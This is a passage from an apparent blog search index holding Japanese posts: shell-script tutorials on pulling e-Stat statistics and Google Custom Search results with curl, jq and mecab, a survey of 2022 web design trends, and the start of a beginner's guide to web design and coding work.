\u0026#34;STATISTICS_NAME_SPEC\u0026#34;,\u0026#34;人権侵犯事件統計\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;TITLE_SPEC\u0026#34;,\u0026#34;人権侵犯事件\u0026#34;,\u0026#34;種類別　人権侵犯事件の受理 及び処理件数　（月次）\u0026#34;,\u0026#34;処理の合計件数と，その内訳であ る措置，措置猶予，侵犯事実不存在，侵犯事実不明確，打切\u0026gt;り，中止，移送及び啓発の各件数の合計とが一致しない場合\u0026gt;があるのは，１つの事件につき複数の措置を採る場合がある\u0026gt;こと等による。\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;VALUE\u0026#34; \u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;人権侵犯事件の受理\u0026gt;・処理別\u0026#34;,\u0026#34;cat02_code\u0026#34;,\u0026#34;人権侵犯事件の種類別\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸(月次)\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2021001111\u0026#34;,\u0026#34;2021年11月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1430\u0026#34;,\u0026#34;\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2021001010\u0026#34;,\u0026#34;2021年10月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1329\u0026#34;,\u0026#34;\u0026#34; データの中身を見てみると\u0026quot;VALUE\u0026quot;から上がヘッダー的な項目で、データは\u0026quot;VALUE\u0026quot;以下にありそうです。\nVALUE より上の行を削除しましょう。\nsed でマッチした行より上を削除する方法ががあると良いのですがわからないのでgrepと組み合わせます。\ngrep -n でマッチした行数を取得できます。\nsed -e \u0026ldquo;1,26d\u0026rdquo; で1行目から26行目までを削除できます\n\u0026#34;tab_code\u0026#34;,\u0026#34;表章項目\u0026#34;,\u0026#34;cat01_code\u0026#34;,\u0026#34;人権侵犯事件の受理・処理別\u0026#34;,\u0026#34;cat02_code\u0026#34;,\u0026#34;人権侵犯事件の種類別\u0026#34;,\u0026#34;time_code\u0026#34;,\u0026#34;時間軸(月次)\u0026#34;,\u0026#34;unit\u0026#34;,\u0026#34;value\u0026#34;,\u0026#34;annotation\u0026#34; \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;2007000101\u0026#34;,\u0026#34;2007年1月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;2170\u0026#34;,\u0026#34;\u0026#34; . . \u0026#34;100\u0026#34;,\u0026#34;件数\u0026#34;,\u0026#34;100\u0026#34;,\u0026#34;総数\u0026#34;,\u0026#34;130\u0026#34;,\u0026#34;私人等に関するもの\u0026#34;,\u0026#34;2021001111\u0026#34;,\u0026#34;2021年11月\u0026#34;,\u0026#34;件\u0026#34;,\u0026#34;1230\u0026#34;,\u0026#34;\u0026#34; VALUE以下の内容を見てみると「_code」はコードが入るだけなので無視して良さそうです。\n表章項目も「件数」しかないので無視して良さそうです。\n時間軸、unite、value、annotationもいらなそうです。\n「人権侵犯事件の受理・処理別」は\n\u0026#34;旧受\u0026#34; \u0026#34;総数\u0026#34; \u0026#34;新受_計\u0026#34; \u0026#34;新受_申告_委員受\u0026#34; \u0026#34;新受_申告_職員受\u0026#34; \u0026#34;新受_人権擁護委員の通報\u0026#34; \u0026#34;新受_関係行政機関の通報\u0026#34; \u0026#34;人権侵犯事件の受理・処理別\u0026#34; これは一旦は総数だけ使えば良さそうです\n「人権侵犯事件の種類別」は\n\u0026#34;総数\u0026#34; \u0026#34;私人等に関するもの\u0026#34; \u0026#34;私人等に関するもの_売春\u0026#34; \u0026#34;私人等に関するもの_その他\u0026#34; \u0026#34;私人等に関するもの_村八分\u0026#34; \u0026#34;私人等に関するもの_交通事故\u0026#34; \u0026#34;私人等に関するもの_人身売買\u0026#34; . . . 人権侵犯事件の種類が並べられています。この部分から社会的関心の高いものを抽出できると良さそうですね。\n抽出対象の列をどこにするのかも将来的に自動化したいのですが今回は固定で「人権侵犯事件の種類別」の列を抽出対象にしたいと思います。\nmecabを使ってマッチングキーワードを最適化する cat \u0026#34;$STCSV\u0026#34;|$SED -e \u0026#34;1,$((vnum+1))d\u0026#34;|$AWK -F, \u0026#39;{print $6;}\u0026#39;|sed -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort|uniq; \u0026#34;私人等に関するもの_売春\u0026#34; \u0026#34;私人等に関するもの_その他\u0026#34; \u0026#34;私人等に関するもの_村八分\u0026#34; \u0026#34;私人等に関するもの_交通事故\u0026#34; \u0026#34;私人等に関するもの_人身売買\u0026#34; \u0026#34;私人等に関するもの_医療関係\u0026#34; \u0026#34;私人等に関するもの_私的制裁\u0026#34; \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34; \u0026#34;私人等に関するもの_差別待遇_その他\u0026#34; \u0026#34;私人等に関するもの_差別待遇_外国人\u0026#34; \u0026#34;私人等に関するもの_差別待遇_性自認\u0026#34; 「私人等に関するもの_交通事故」という文字列はニュースなどではそのまま使われないでしょうからそのままgoogle custom search の検索結果にマッチングをかけてもダメそうです。\nmecab を使って文字列を分解してマッチングをかけたいと思います。\nmecabはオープンソースの形態素解析エンジンです入力した文字列を構文解析してくれます。\necho \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34;|mecab 私人\t名詞,一般,*,*,*,*,私人,シジン,シジン 等\t名詞,接尾,一般,*,*,*,等,トウ,トー に関する\t助詞,格助詞,連語,*,*,*,に関する,ニカンスル,ニカンスル も\t助詞,係助詞,*,*,*,*,も,モ,モ の\t助詞,連体化,*,*,*,*,の,ノ,ノ _\t名詞,サ変接続,*,*,*,*,* 差別\t名詞,サ変接続,*,*,*,*,差別,サベツ,サベツ 待遇\t名詞,サ変接続,*,*,*,*,待遇,タイグウ,タイグー _\t名詞,サ変接続,*,*,*,*,* 女性\t名詞,一般,*,*,*,*,女性,ジョセイ,ジョセイ EOS 取り出すのは名詞だけで良さそうですし、名詞でも1文字だけのものは除外したほうが良さそうですね\necho \u0026#34;私人等に関するもの_差別待遇_女性\u0026#34;|mecab|grep \u0026#34;名詞\u0026#34;|awk \u0026#39;{print $1;}\u0026#39;|grep -v ^.$ 私人 差別 待遇 女性 マッチングしてみる このキーワードでgoogle custom search の検索結果にマッチングをかけカウント数を取得して見ましょう。\n11,私人等に関するもの_強制・強要_家族間のもの_親の子に対するもの 11,私人等に関するもの_社会福祉施設関係_施設職員によるもの 14,私人等に関するもの_差別待遇_同和問題（うち公務員によるもの） 18,私人等に関するもの_社会福祉施設関係_施設職員によるもの（うち公営の施設に従事する職員によるもの） 19,私人等に関するもの_プライバシー関係_インターネット（うち同和問題に関する侵犯） インターネットがマッチしたのは良いのですが「同和問題」の中の「問題」の部分でカウント数を稼いでしまって思うような感じにはなりません。\n「もの」とかもカウント数を稼いでいるので汎用的なキーワードを除外する処理を入れる必要がありそうです。\n自動化の道のりは遠いですね。\nプログラム function getStatistics(){ : #curl -s \u0026#34;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=$ESID\u0026amp;lang=J\u0026amp;statsDataId=0003286680\u0026amp;metaGetFlg=Y\u0026amp;cntGetFlg=N\u0026amp;explanationGetFlg=Y\u0026amp;annotationGetFlg=Y\u0026amp;sectionHeaderFlg=1\u0026amp;replaceSpChars=0\u0026#34; -o \u0026#34;$STCSV\u0026#34; } function matchGcs(){ #VALUEより上の行を削除する vnum=$(cat \u0026#34;$STCSV\u0026#34;|grep -n \u0026#34;VALUE\u0026#34;|$AWK -F: \u0026#39;{print $1;}\u0026#39;) echo \u0026#34;$vnum\u0026#34; cat \u0026#34;$STCSV\u0026#34;|$SED -e \u0026#34;1,$((vnum+1))d\u0026#34;|$AWK -F, \u0026#39;{print $6;}\u0026#39;|$SED -e \u0026#34;s|\\\u0026#34;||g\u0026#34;|sort|uniq|while read line;do local mcnt=$(echo \u0026#34;$line\u0026#34;|mecab|grep \u0026#34;名詞\u0026#34;|awk \u0026#39;{print $1;}\u0026#39;|grep -v -e ^.$|while read word;do cat \u0026#34;$GCSCSV\u0026#34;|grep \u0026#34;$word\u0026#34;|wc -l done| awk \u0026#39;{sum+=$0} END{print sum;}\u0026#39;); echo \u0026#34;$mcnt,$line\u0026#34; done|sort|uniq|sort -n } function main(){ #統計名でgoogle cloud searchを検索する getGcs;\u0026lt;---前回作成したもの #統計データを取得する getStatistics; #統計データの列情報とgoogle cloud searchの検索結果をマッチングする matchGcs; } main; exit; ","date":"2022-01-21T13:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-21-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（４）"},{"content":"google Custom Searchの検索結果をcsvに整形する 統計データから列名を取得してgoogle Custom Searchの検索結果に当てに行きマッチする回数の高い列名を社会的関心の高い項目に設定したいと思います。\n全開でgoogle Custom Searchの検索の絞り込みができたのでAPIを叩く回数は統計名ごとに3回にしたいと思います。\nstart パラメータを1から開始して10ずつインクリメントしていきます。\ncurl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=1\u0026#39; curl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=11\u0026#39; curl -s \u0026#39;https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxx\u0026amp;cx=xxxxxx\u0026amp;q=人権侵犯事件統計\u0026amp;start=21\u0026#39; 3回APIを叩いた結果に対してマッチングをかけていきたいと思うのですが、google Custom Searchの検索結果を見やすくするため前準備としてcsvに整形したいと思います。\ngoogle Custom Searchの検索結果はjsonですがjsonのパースはjqを使います。\njqのインストール jqのインストールは簡単です。\nbrew install jq jqを使ってgoogle Custom Searchの検索結果をjsonをパースする \u0026#34;items\u0026#34;: [ ¦ { ¦ ¦ \u0026#34;kind\u0026#34;: \u0026#34;customsearch#result\u0026#34;, ¦ ¦ \u0026#34;title\u0026#34;: \u0026#34;昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞\u0026#34;, ¦ ¦ \u0026#34;htmlTitle\u0026#34;: \u0026#34;昨年の\\u003cb\\u003e人権侵犯事件\\u003c/b\\u003e いじめ、教員関係が半減 | 教育新聞\u0026#34;, ¦ ¦ \u0026#34;link\u0026#34;: \u0026#34;https://www.kyobun.co.jp/news/20210323_03/\u0026#34;, ¦ ¦ \u0026#34;displayLink\u0026#34;: \u0026#34;www.kyobun.co.jp\u0026#34;, ¦ ¦ \u0026#34;snippet\u0026#34;: \u0026#34;2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...\u0026#34;, ¦ ¦ \u0026#34;htmlSnippet\u0026#34;: \u0026#34;2021/03/23 \\u003cb\\u003e...\\u003c/b\\u003e それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した\\u003cb\\u003e人権侵犯事件\\u003c/b\\u003eは9589件で、前年よりも5831件減少。同省の担当者は「他の\\u003cb\\u003e統計\\u003c/b\\u003e\u0026amp;nbsp;...\u0026#34;, items配列の中に検索結果が保存されているみたいです。\n取得する項目は、title、snippet、linkにします。\njqでカウントを取得する方法は length です。\njq \u0026#39;.items | length\u0026#39; 配列以下の要素の取り方は\njq -r .items[0].title です。\n返却結果にダブルクォーテーションが入るのが邪魔なのでオプション -r をつけています。\nプログラムの内容、出力結果 プログラムは以下となります\n#!/bin/bash #グーグルカスタムサーチの結果を取得します APKEY=\u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34;; EGID=\u0026#34;xxxxxxxxxxxx\u0026#34;; START=1; STATISTICS=\u0026#34;$1\u0026#34;; AWK=`which gawk`; SED=`which gsed`; TMP=\u0026#34;gcstmp.json\u0026#34; RST=\u0026#34;gcsrst.csv\u0026#34;; cnt=0; function parse(){ items=$(cat \u0026#34;$TMP\u0026#34;|jq .items); length=$(echo \u0026#34;$items\u0026#34;|jq \u0026#39;.| length\u0026#39;); pcnt=0; while :;do if [ \u0026#34;$pcnt\u0026#34; -ge \u0026#34;$length\u0026#34; ];then break; fi item=$(echo \u0026#34;$items\u0026#34;|jq .[$pcnt]); title=$(echo \u0026#34;$item\u0026#34;|jq -r .title); snippet=$(echo \u0026#34;$item\u0026#34;|jq -r .snippet); link=$(echo \u0026#34;$item\u0026#34;|jq -r .link); echo \u0026#34;$title,$snippet,$link\u0026#34;|tee -a \u0026#34;$RST\u0026#34;; pcnt=$((pcnt+1)); done } function main(){ :\u0026gt;\u0026#34;$RST\u0026#34;; while :;do if [ \u0026#34;$cnt\u0026#34; -ge 3 ];then break; fi st=$((cnt*10+1)) curl \u0026#34;https://www.googleapis.com/customsearch/v1?key=$APKEY\u0026amp;cx=$EGID\u0026amp;q=$STATISTICS\u0026amp;start=$st\u0026#34; -o $TMP parse; cnt=$((cnt+1)); done } main; exit; 整形した検索結果は以下のようになります\n昨年の人権侵犯事件 いじめ、教員関係が半減 | 教育新聞,2021/03/23 ... それによると、昨年1年間に、同省の人権擁護機関が新たに救済手続きを開始した人権侵犯事件は9589件で、前年よりも5831件減少。同省の担当者は「他の統計 ...,https://www.kyobun.co.jp/news/20210323_03/ 難民とLGBT：世界における人権侵害の状況 | 難民研究フォーラム ...,2020/12/24 ... マッピング. 2019年末現在、「LGBTであること」や「同性間の性行為」などを刑法において犯罪としている国をマッピング ...,https://refugeestudies.jp/2020/12/lgbt/ 人権擁護委員 - Wikipedia,全国の人権擁護委員の2011年（平成23年）中の活動実績は、次のとおりである。 人権啓発活動従事回数 - 227,683回; 人権相談事件取扱件数 - 159,157件; 人権侵犯事件関与 ...,https://ja.wikipedia.org/wiki/%E4%BA%BA%E6%A8%A9%E6%93%81%E8%AD%B7%E5%A7%94%E5%93%A1 法務省：インターネットによる人権侵害をなくしましょう – Gov base,2021/04/30 ... ※プロバイダ責任制限法等については、後述の「参考」をご覧ください。 インターネットに関する人権侵犯事件の新規救済手続開始件数. 法務省の人権擁護機関 ...,https://www.gov-base.info/2021/04/30/112474 ","date":"2022-01-20T17:50:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（３）"},{"content":"出典元：Web design trends for 2022 | Layout\nこの2年間で学んだことは、私たちは常に新しいものに適応し続けなければならないということです。2022年に向けて、デザイナーは人生のカオスを受け入れ、それをデザインで表現し始めています。\n2022年のトレンドは、より大胆で、よりクリエイティブで、よりインタラクティブなデザインに移行しています。クリエイターは、より破壊的なものに傾倒し、「良い」ウェブデザインとされるものの境界を押し広げようとしています。\n2022年に期待されるトレンドを取り入れ、新しい年のクリエイティビティを高めてください。\nインタラクティブなミニサイト あなたの実力をアピールしてください。専門性の高いコンテンツとインタラクションで、小規模で統制のとれた環境でスキルを発揮することは、デザイナーが新しいクライアントを獲得するための1つの方法です。また、潜在的な顧客に対しては、「作ることを楽しむ」ことで、オンリーワンの体験を提供できることをアピールしています。\n韓国の開発者、Jungik Leeが制作した、3つの簡単なタスクのいずれかをクリアするミニサイトです。たくさんの色と簡単な操作で、いろいろなものを作ったり動かすことができ、カラフルな丸でページが埋め尽くされる様子は、実に楽しいものです。\nアムステルダム在住のウェブデザイナー、ヴィクトワール・ドゥイさんの小さなポートフォリオサイト では、インタラクティビティを駆使して人々の関心を集めています。カーソルを動かすだけで、色を変えたり、糸を引っ張ったり、オブジェクトを動かしたりできます。\nレトロな雰囲気のあるデザイン 米国のWebデザイナーの平均年齢は37歳で、ミレニアル世代に位置づけられます。ミレニアル世代はインターネットを日常的に利用するようになった最初の世代ですから、多くのデザイナーがウェブ創成期に流行したアートやタイポグラフィー、カラーに影響を受けているのは当然といえば当然でしょう。\nWild SoulsのEコマースサイトは、カラフルなシェイプと重なり合うスタイルで、食品会社にふさわしい楽しくて活気のある美学を表現しています。 ナッツ、ナッツバター、ハチミツ、マーマレードの専門店で、商品の上にカーソルを置くと、90年代にインスパイアされたビジュアルテーマをもとに、新しい質感や形がセンスよく追加されます。\nカートゥーン ネットワークは、白と黒を基調とし、大胆な色使いと楽しいアニメーションで、レトロでありながらトレンドを押さえたサイトです。\nオープンコンセプトデザイン この大流行が、私たちのデザイン嗜好にも影響を与えているのかもしれません。なぜなら、デザインに多くのオープンスペースを設けるという新たなトレンドが生まれたからです。6フィート（約3.5メートル）とはいかないまでも、デザイナーはセクション間のスペースをどんどん広げ、見出しに集中し、時にはヒーロー画像を完全に削除してユーザーに十分なスペースを与えています。\nどんな種類の蒸留酒もシャープでキレがあり、コロラド州デンバーにあるベア・クリーク蒸留所のウェブサイトも、余計な添加物を排除しています。ウェブサイトのデザインコンセプトは、彼らが精製するウォッカ、バーボン、ラム、ウイスキーと同様にクリーンです。\nアタルソン は、ニューヨークを拠点に、プロダクトとパッケージのデザイン、素材調達、製造を行っている会社です。サステナビリティは彼らのプロセスの中核であり、クリーンな製造という考え方は、ホワイトスペースの使用によってサイトでも視覚的に反映されています。このオープンスペースにより、デザインされた製品にスポットライトが当たり、画像上のホバー効果により、製品の概要や企業価値の説明が表現されています。\nより多くのカスタマイズ ユーザーがオンライン上で時間とお金を費やす機会が増えるにつれ、プロバイダーはより幅広い層のユーザーにアピールするための新たな方法を見出しています。そのため、多くのプロバイダーは、サイトやアプリで利用できるパーソナライゼーションのレベルを高め、すべてのサイトが従うべき標準的なアクセシビリティのベストプラクティスを超えるインクルージョン機能の大幅な改善を行っています。\nPinterest の「ビューティー」カテゴリは、サイト内でもっとも検索されているカテゴリの1つであり、同社はすべてのユーザーに対してより包括的に対応する必要性を認識していました。Pinterestは現在、「skin tone range」機能を提供することで、このカテゴリーにおいてより速く、よりパーソナライズされた体験を生み出しています。多くのユーザーにとって、これはアプリ上の明るい肌色の過飽和状態に対する答えであり、すべてのPinterestユーザーがより迅速かつ容易に自分に合った外見を見つけることができるようになりました。\nMastercardは、「True Name」システムを構築することで、より多くのカード会員が取引時に自分の本当のアイデンティティを表現できるようにする方法を見出しました。これにより、トランス系やノンバイナリのMastercard保有者は、法的に名前が変更されているかどうかにかかわらず、デッドネームの代わりに本名をカードに記載することができるようになりました。\n3Dオブジェクト、2Dスクロール 3Dモデルを使ったデザインと、フラットな2Dのコンテンツ表現は、説得力があり、完全に一体化しているように見えます。インタラクティブな3D要素を背景に、消化しやすいコンテンツを予測可能な方法で提示することは、ユーザーが物理的な概念をよりよく理解するためにとくに有効です。\nロシア・モスクワの中心部に位置するこの新しいビジネス街のプロモーションサイトは、3Dのセンターピースとシンプルでフラットなコンテンツに焦点を当てた素晴らしい例です。トップページにはスコルコボ・パークの可動式模型が表示されていますが、目立つように配置されたコンテンツの影に隠れることはありません。\nOne Ocean Scienceは、海洋保全と研究のグローバルリーダーを学際的な視点でつなぐことを目的とした、知識共有型のサミットです。ホームページでは、地球の3Dモデルの上を2Dでスクロールし、スクロールに合わせてさまざまな地域とそこで行われている研究を強調することでユーザーに情報を与えてます。\nブルータリズム・ライト ブルータリズムとは、非常にブロック的で幾何学的な、厳しい芸術や建築のスタイルを指します。ウェブデザインでは、従来のルールにとらわれず、ミニマリズムを追求した、大胆かつシンプルなスタイルが目立ちます。白と黒を基調としたサイトが多く、装飾はほとんどなく、文字も太く、峻厳な仕上がりになっているのが特徴です。\nイタリアのクリエイティブ・エージェンシー、カロセリングのブランド・アイデンティティは、正直で率直であることです。現実的な期待値を設定し、戦略の影響を考え抜き、クライアントの時間的・予算的制約を尊重することを信条としています。ブルータリスティックなサイトは、飾り気のない代理店のパートナーとしての彼らのストーリーを表現するのに役立っています。\nパリを拠点とするカリフォルニア生まれのデザイナー、リック・オウエンスは、かつて自身の家具デザインに対する哲学を \u0026ldquo;ブルータリズムの洞窟の中でブルータリズムの火のそばのブルータリズムの岩の上に立つ毛皮 \u0026ldquo;と表現したことがあります。彼の服やアクセサリーラインのウェブサイトには、家具はありませんが、イメージやレイアウトに明確なブルータリズムのインスピレーションを感じることができます。\nガラスモルフィズム グラスモーフィズム とは、その名の通り、画面がガラスでできている、あるいはガラスで覆われているかのように見せる技術で、一般的にはユーザーインターフェイスの背景をぼかすために使用されます。2022年には、デザイナーがガラスのようなアニメーションオブジェクトやテキストを作成し、フロントエンドの境界を押し広げることで、このトレンドはさらに人気を集めると思われます。\nデジタル製品エージェンシーの Dovetail Studios は、異なる角度で回転する入れ子のリングのGlassmorphicセットをアニメーション化しました。目を引くとともに、彼らの3Dモデリング能力の高さがうかがえます。サイト内の他のアイコンも、この効果を反映しています。\n同じくデジタル・クリエイティブ・エージェンシーのLo and Behold Studios も、ホームページでGlassmorphicのアニメーション・オブジェクトを使用しています。しかし、全体的に明るいテーマであるため、ユーザーがDovetailのサイトを見たときに感じる印象とはまったく異なるものとなっています。\nクリエイティブなスクロール効果 多くのデザイナーは、昨年の横スクロールのトレンドを発展させ、さらにスクロールの効果を試しています。水平、横、多方向のいずれであっても、ユーザーがサイト内を移動する方向を変えることは、全体としてよりダイナミックな体験をユーザーに与える簡単な方法です。\nオランダの家具メーカー Moooi は、ユーザーがスクロールするにつれて、コレクションの奥深くに入り込んでいきます。同社のサイトでは、3つの体験ができます。美しく咲き、重力に逆らっていくまるで紙芝居のような体験です。それぞれ、画面を開くとコレクションが次々と現れ、スクロールするたびに新しいパターンや飾り模様に飛び込んでいきます。\n写真家のKayla Fisherさんの サイト では、サイドバイサイドスクロールで、メニューは画面の左側にべったりと配置されています。これによって、ユーザーにより深く入り込んでもらうための大きなボタンを見失うことなく、視覚的に魅力的な方法で彼女の作品を見ることができます。\n特大のタイポグラフィ ウェブサイトは、企業としてのあり方を大胆に表現するものであるべきです。多くの企業がこの考えを真摯に受け止め、見出しに特大のタイポグラフィを使用したり、ヒーロー画像（キャッチ画像）の代わりに使用したりしています。\nテクノロジー研究集団 HUMAIN は、人間の体験と技術革新の間のギャップを埋めるために活動しています。クロノス・グループの支援を受け、オンラインと生活の両方で人間の経験を向上させるために新技術を使用する新しい方法を見つけることを目的としています。複雑なストーリーを持つこの企業は、ヒーロー画像の代わりにテキストを使用することで、サイトに入った瞬間からその使命を訴えています。\nヘッドホンといえば、視覚的なものと同じくらい聴覚的なアイデアが思い浮かびます。ヘッドホンメーカーの AIAIAI の社名は、名前と同じくらい感嘆詞で、サイトを訪れたユーザーに大胆な主張を叫んでいます。大きなテキストで会社を紹介した後、折り返しのすぐ下の小さなヒーローに隣接した動画が表示され、ヒーロー画像→テキストという従来のパターンを崩しているのです。\n可視化された境界線 目に見えるボーダーは、デザインに構造を与え、コンテンツを通してユーザーの注意を引きつけます。シンプルな線だけで構成されるボーダーは、整然としたサイトを必要とするクライアント向けのデザインに役立ちます。一方、ファンキーでインタラクティブなボーダーは、大胆な色使いやインタラクティブな効果によって、オンライン訪問者にさらなる視覚的な興味を与えることができます。\n独立機関である Bonjour Paris は、可視化されたボーダーと水平スクロールを組み合わせることで、ミニマルでありながら興味をそそるサイトになっています。線状のボーダーは、サイト全体からプロジェクトセクションまで続き、曖昧で忙しい印象を与えることなく、新しい形を生み出しています。\nオーストラリアのレストラン「Curry Cafe」は2つの店舗を持ち、サイトのスクロールボーダーは、ユーザーがカラフルで魅力的な他のコンテンツを消費するための強固なフレームワークを提供します。\n抽象的なビジュアルを持つコラージュ部品 ウェブが始まってから、私たちは長い道のりを歩んできました。あるデザイナーは構造化された美学を受け入れ、またあるデザイナーは逆の方向に進んでいます。大胆な色使い、重なり合う画像、複数のテクスチャーなど、それぞれの要素が丁寧にデザインされていれば、シームレスに融合することができるのです。\nIlluminating Radioactivity は、 スティムソンセンター 、 Reinventing Civil Defenseプロジェクト 、 [Bombshelltoe Policy x Arts Collective]https://bombshelltoe.com/ が共同で作成した教育用ウェブサイトです。放射能」という言葉の歴史や意味、私たちの連想、そして放射能が科学、娯楽、医療などの分野でどのような役割を担ってきたのかが紹介されています。スクロールすると、歴史を物語る古い写真と、鮮やかで抽象的な形状の組み合わせが目に飛び込んできます。\nオーストラリアのThe Loved Up Coは、パートナーとの夜の生活に必要なものがすべて揃った便利なキットで、デートの夜を華やかにするお手伝いをしています。ホームページでは、白黒写真のボディに、笑顔の口元や花、カクテルを組み合わせたコラージュ風の人物を掲載。また、抽象的な形や円、ジグソーパズルを随所に配し、コンテンツの中で視線を動かし続けています。\nウェブの未来をデザインする これらのトレンドに注目し、気になるコンセプトを試してみてはいかがでしょうか。2022年のウェブデザインのトレンドは、昨年のトレンドの延長線上にあることにお気づきの方もいらっしゃるのではないでしょうか。\n気に入ったものはありましたか？私たちが見逃しているものがあれば、教えてください。そして、残るスタイルも流行り廃りも、デザイナーが今年、クライアントと一緒に何を作るかにかかっていることを忘れないでください。\n","date":"2022-01-20T17:36:49+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/catch_hua1e03cb04863b34ec3302b219f888af8_22468_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/","title":"2022年のWebデザインの最新トレンドとレイアウト"},{"content":"はじめに 「未経験でもWebデザイナー、コーダーになろう」ではWebデザイナーやコーダーなどWeb業界を目指す方に、現役Webデザイナー兼コーダーができるだけわかりやすく、Webサイトをデザインしたり、作ったりする方法は情報を伝える講座です。\n初心者の方、そうでない方など、いろいろな方大歓迎です。\nまずはWebデザイナーやコーダーと言われる人たちがいる、Web業界の実際はこうだよというのをお伝えします。\nWeb業界に入るためには未経験だと厳しい？ 未経験だと厳しい？ 学校で習わないと難しそう。 このようなことを思っているかもしれません。しかし、そんなことなありません。\nWebで働いてみたいという気持ちとポートフォリオと呼ばれる作品集。\nなにより少しでもできるてしまえば、入れる業界だと思います。\n\u0026quot;\u0026quot; 初期費用が色々かかる？ パソコンを用意 Photoshopなどの高いアプリを買う必要がある こういったことで、初期費用が色々かかるかと思っている人も多いと思います。\n今の時代は様々なWebサービスを駆使していろいろなことが無料でできます。\nもちろん、パソコンを持っていたほうが作業は簡単かもしれませんが、iPhoneやiPad、廉価なChromeBookやWindowsなどでもデザインからコーディングまでできてしまいます。\n特にiPhoneやiPadはデザインに特化することができると思います。\nそういったサービスやコンテンツ、アプリを使用してデザインからコーディングを行って誰でも簡単に自分のサイトを持つことができるようになりました。\nほんといい時代になりましたね。\nWEBデザイナーとは Webデザイナーと聞いてイメージするのは\nカッコいいサイトをデザインしている人 美的センスがいりそう Photoshopを使ってデザインをしている と思うかもしれません。しかし、それが重要だと私は思いません。\nもっと重要なのは「情報をわかりやすくして、配置する力」ではないかと思います。\n\u0026quot;\u0026quot; WEBデザイナーとは「情報をわかりやすくして、配置する人」 Webデザイナーと一般的なデザイナーの違いは「Webデザイナーは何かを表現するものではない」と言う点だと思います。\n「Webデザイナーは情報をわかりやすくして、配置する人」こういうものではないかなと私は考えてます。\nデザインする上で、大事なのはそれぞれの関係性はどうなっているかです。\nそれをわかりやすく伝える、そのためには関連性があるものは近くにあったほうがいい。\nそうやって散らばっている情報と情報をつなげていく。それがWebデザイナーではないかと思います。\n\u0026quot;\u0026quot; Webコーダーは「Webデザインを表示して、使い勝手を作る人」 WebコーダーはWebデザインを実際にHTMLと言われる言語に書き換えて、CSSと呼ばれる言語でHTMLをお化粧していきます。\nお化粧をしていく上で大事なのはGoogleやBingのクローラーと呼ばれるプログラムに拾われやすくするということを意識しなければなりません。\nこれを SEO といいますが、今は知らなくても大丈夫です。\n簡単に言えば、ネットという広い海に出すためにわかりやすい地図を作ってくれる人にわかりやすく伝えるということです。\nデザイナーは見た目を作っていきますが、コーダーは使い勝手を作っていると言ってもいいのかもしれません。\nその他にも、Javascriptと呼ばれる言語を使って動きやいろいろな処理を行う場合もあります。\nWebデザイナーとコーダーは別のほうがいい？ Webデザイナーとコーダーが別々の作業を行って、もう片方の仕事内容を知らないでもいいかといえば、そうではありません。相互に理解していたほうがいいと思います。\nWebデザイナーがコーディングを知らない場合 例えば、Webデザイナーがボタンを押したときや開閉機能をつけたときの挙動をデザインしたとします。その場合の動作は誰が考えるのでしょう？\n多くの場合はデザイナーの頭の中に「ふわっと出したい」や「回転しながら出したい」といった考えがあるかと思います。スライドするコンテンツについても同様です。\nその際に、コーディングを知らなかったら指示を出せずに、コーダーの解釈でデザインが行われてしまいます。\nWebコーダーがデザインを知らない場合 逆にコーダーがデザインを知らないと、どうでしょうか。\n小さなデザインを見落として、デザイナーが作ったものと違うものが出来上がってしまうかもしれません。\n小さなデザインだったら気にならないのでは？と思うかもしれませんが、デザインではその違いが大きな違いにつながったりします。\nお互いに知ることが大事 